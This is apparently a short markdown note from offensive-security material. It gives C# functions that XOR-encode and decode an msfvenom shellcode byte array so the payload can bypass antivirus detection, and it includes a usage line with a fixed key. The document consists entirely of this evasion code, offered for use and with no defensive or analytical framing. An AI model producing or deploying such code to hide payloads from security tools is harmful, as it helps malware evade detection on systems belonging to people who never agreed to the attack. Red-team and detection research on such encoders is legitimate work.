## C# Function to encode 'buf' payload from msfvenom to bypass AV


### Usage: XORencode(buf, 0x5f);  

``` Csharp

#
        public static void XORencode(byte[] _data, byte _key)
        {
            byte[] bufencoded = new byte[_data.Length];
            byte key = _key;



            for (int i = 0; i < _data.Length; i++)
            {
                bufencoded[i] = (_data[i] ^= key);
            }

            StringBuilder hex = new StringBuilder(bufencoded.Length * 2);
            foreach (byte b in bufencoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("Encoded: byte[] buf = new byte[{0}] {{ {1} }}", bufencoded.Length, hex.ToString().TrimEnd(','));
        }
        public static byte[] XORdecode(byte[] data, byte key)
        {
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key; // XOR again to get original
            }

            StringBuilder hex = new StringBuilder(data.Length * 2);
            foreach (byte b in data)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("decoded: byte[] buf = new byte[{0}] {{ {1} }}", data.Length, hex.ToString().TrimEnd(','));


            return data;
        }


```
